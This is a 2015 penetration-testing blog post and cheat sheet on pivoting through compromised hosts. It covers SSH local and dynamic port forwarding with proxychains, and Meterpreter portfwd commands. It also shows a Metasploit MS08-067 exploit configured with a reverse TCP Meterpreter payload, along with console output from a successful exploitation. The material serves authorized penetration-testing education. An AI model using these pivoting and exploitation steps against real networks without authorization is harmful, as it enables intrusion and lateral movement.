---
layout: blog_item
title:  "SSH & Meterpreter Pivoting Techniques"
date:   2015-03-20 00:52:10
author: Arr0way
categories: [penetration testing] 
---

* list element with functor item
{:toc}

## WTF is Pivoting? 

**Pivoting** is a technique used to route traffic through a compromised host on a penetration test. 

When conducting an external penetration test you may need to route traffic through a compromised machine in order to compromise internal targets. 

**Pivoting**, allows you to leverage tools on your attacking machine while routing traffic through other hosts on the subnet, and potentially allowing access to other subnets.

## SSH Pivoting Cheatsheet 

### SSH Port Forwarding

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>ssh -L 9999:10.0.2.2:445 user@192.168.2.250</code></p>
      </td>
      <td>
            <p>Port 9999 locally is forwarded to port 445 on 10.0.2.2 through host 192.168.2.250</p>
      </td>
    </tr>
      </tbody>
</table>
</div>


### SSH Port Forwarding with Proxychains 

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>ssh -D 127.0.0.1:9050 root@192.168.2.250</code></p>
      </td>
      <td>
            <p>Dynamically allows all port forwards to the subnets availble on the target.</p>
      </td>
    </tr>
      </tbody>
</table>
</div>

<div class="note warning">
  <h5>Dynamic Proxychain Warning</h5>
  <p>Dynamic Proxychain SSH port forwarding does not work with nmap and metasploits meterpreter shells won't spawn.</p>
</div>

If you attempt to spawn a shell via Meterpreter, you'll get an error similar to the following:

{% highlight bash %}
meterpreter > execute -f cmd.exe -i -H
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:41713-<--timeout 
{% endhighlight %}

### Using Proxychain port forwards

When using a Proxychain port forward, all commands need to be prefixed with the proxychain command, this instructs the application traffic to route through the proxy. 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">Connecting to RDP via Proxychains Dynamic Port Forwarding</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">proxychains rdesktop TARGET-IP</span>
        </p>
        </p>
      </div>
    </div>
</section>



## Configure Metasploit to use a SSH Pivot

The following is an example of how to configure Metersploit to use a SSH portward. In this example port 9999 is forwarded to the target and the attacking machine has an IP address of 192.168.2.100: 

{% highlight bash %}
Setup the port forward (instructions above), then configure msfconsole as follows (using MS08_067 in this example). 

 msf exploit(ms08_067_netapi) > show options

 Module options (exploit/windows/smb/ms08_067_netapi):

    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
   RHOST    0.0.0.0          yes       The target address
    RPORT    9999             yes       Set the SMB service port
    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


 Payload options (windows/meterpreter/reverse_tcp):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)
    LHOST     192.168.2.100   yes       The listen address
    LPORT     443              yes       The listen port


 Exploit target:

    Id  Name
    --  ----
   0   Automatic Targeting
{% endhighlight %}

### Don't use 127.0.0.1 with Metasploit 

The example above uses 0.0.0.0 **Not 127.0.0.1**, never use 127.0.0.1 with Metasploit or you'll get the following error after you attempt to do anything post exploit: 


{% highlight bash %}
 exploit(ms08_067_netapi) > exploit

 [*] Started reverse handler on 192.168.14.183:443 
 [*] Automatically detecting the target...
 [*] Fingerprint: Windows XP - Service Pack 3 - lang:English
 [*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
 [*] Attempting to trigger the vulnerability...
 [*] Sending stage (769536 bytes) to 192.168.15.252

msf meterpreter > getuid
 [-] Session manipulation failed: Validation failed: Address is reserved ["/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/validations.rb:56:in `save!'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/attribute_methods/dirty.rb:33:in `save!'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:264:in `block in save!'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:313:in `block in with_transaction_returning_status'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/database_statements.rb:192:in `transaction'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:208:in `transaction'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:311:in `with_transaction_returning_status'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:264:in `save!'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:377:in `block in report_host'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/connection_pool.rb:129:in `with_connection'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:323:in `report_host'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:2031:in `block in report_event'", "/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/connection_pool.rb:129:in `with_connection'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:2025:in `report_event'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:222:in `report_event'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:331:in `session_event'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:408:in `block in on_session_output'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:407:in `each'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:407:in `on_session_output'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:183:in `block in method_missing'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:181:in `each'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:181:in `method_missing'", "/opt/metasploit/apps/pro/msf3/lib/msf/core/session_manager.rb:242:in `block in register'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:271:in `call'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:271:in `print_error'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:436:in `unknown_command'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:411:in `run_single'", "/opt/metasploit/apps/pro/msf3/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:190:in `call'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:190:in `run'", "/opt/metasploit/apps/pro/msf3/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'", "/opt/metasploit/apps/pro/msf3/lib/msf/base/sessions/meterpreter.rb:396:in `_interact'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/interactive.rb:49:in `interact'", "/opt/metasploit/apps/pro/msf3/lib/msf/ui/console/command_dispatcher/core.rb:1745:in `cmd_sessions'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:427:in `run_command'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:389:in `block in run_single'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in `each'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in `run_single'", "/opt/metasploit/apps/pro/msf3/lib/msf/ui/console/command_dispatcher/exploit.rb:142:in `cmd_exploit'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:427:in `run_command'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:389:in `block in run_single'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in `each'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in `run_single'", "/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:200:in `run'", "/opt/metasploit/apps/pro/msf3/msfconsole:148:in `<main>'"]
{% endhighlight %}


## Meterpreter Pivoting Cheatsheet

Assuming you've compromised the target machine and have a meterpreter shell, you can pivot through it by setting up a **meterpreter port forward**.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
      <tr>
      <td>
        <p><code>portfwd add –l 3389 –p 3389 –r target-host</code></p>
      </td>
      <td>
            <p>Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</p>
      </td>
    </tr>
      </tbody>
</table>
</div>


<div class="note info">
  <h5>Meterpreter Port Forwards are flakey</h5>
  <p>Meterpreter port forwards can be a bit flakey, also the meterpreter session needs to be remain open.</p>
</div>

In order to connect to the compromised machine you would run: 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">Connect to RDP via Meterpreter Port Forward</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">rdesktop 127.0.0.1</span>
        </p>
        </p>
      </div>
    </div>
</section>

## Pivoting Example Diagrams

Pivoting can be a bit hard to understand on paper, so here are some diagrams for clarification with the associated commands.

![Brace for Wonky Visio Arrows](http://i.imgur.com/UVoxUFl.png)

### Starting Point 

You'll need to have access to a compromised machine on the target network, depending on the compromised machines configuration you may or may not need root. 

![SSH Pivot Example 1: Starting Point](http://i.imgur.com/zRIqADW.png) 

### Routing Traffic to the Same Subnet

![Pivot Example 2: Routing traffic to the same subnet](http://i.imgur.com/TXV6ehn.png)

####Example commands 

##### SSH Pivoting using Proxychains

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">Dynamic SSH Pivoting Command using proxy chains</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">ssh -D 127.0.0.1:9050 root@192.168.2.2</span>
        </p>
        </p>
      </div>
    </div>
</section>

You could then connect to Target 2's RDP server using: 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">Connecting to RDP via Proxychains Dynamic Port Forwarding</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">proxychains rdesktop 192.168.2.3</span>
        </p>
        </p>
      </div>
    </div>
</section>

##### SSH Port Forwarding Command

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">RDP SSH Port Forwarding</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">ssh -L 3389:192.168.2.3:3389 user@192.168.2.2</span>
        </p>
        </p>
      </div>
    </div>
</section>

You could then connect to Target 2's RDP server using:

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">Connecting to RDP via SSH Port Forwarding</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">rdesktop 127.0.0.1</span>
        </p>
        </p>
      </div>
    </div>
</section>

### SSH and Meterpreter Pivoting

This example uses SSH pivoting and Meterpreter port forwarding to access machines on subnet 2. 

![Pivot Example 3: Using SSH and Meterpreter Pivoting to access another subnet](http://i.imgur.com/zRIqADW.png)

####Example commands

The above commands would be leveraged to reach **Target 2**, from **Target 2** to **Target 3**, meterpreter would be used. Follow the [meterpreter portwarding example](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#meterpreter-pivoting-cheatsheet) above for a MS08-067 example. 

If this was helpfull, click tweet below. 

Enjoy.
